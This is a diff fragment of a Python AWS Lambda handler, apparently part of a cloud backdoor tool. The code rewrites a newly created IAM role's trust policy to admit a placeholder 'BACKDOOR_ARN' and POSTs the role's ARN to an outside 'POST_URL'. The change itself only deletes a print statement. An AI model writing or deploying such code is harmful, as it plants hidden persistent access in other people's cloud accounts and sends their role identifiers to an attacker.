@@ -14,7 +14,6 @@ def lambda_handler(event,context):
         response=client.update_assume_role_policy(RoleName=name,PolicyDocument=json.dumps(new))
         data={"RoleArn":event['detail']['responseElements']['role']['arn']}
         r=http.request('POST', 'POST_URL', headers = {'Content-Type': 'application/json'}, body=json.dumps(data))
-        print(r.text)
     return
 def handle_change(original):
     arn='BACKDOOR_ARN'
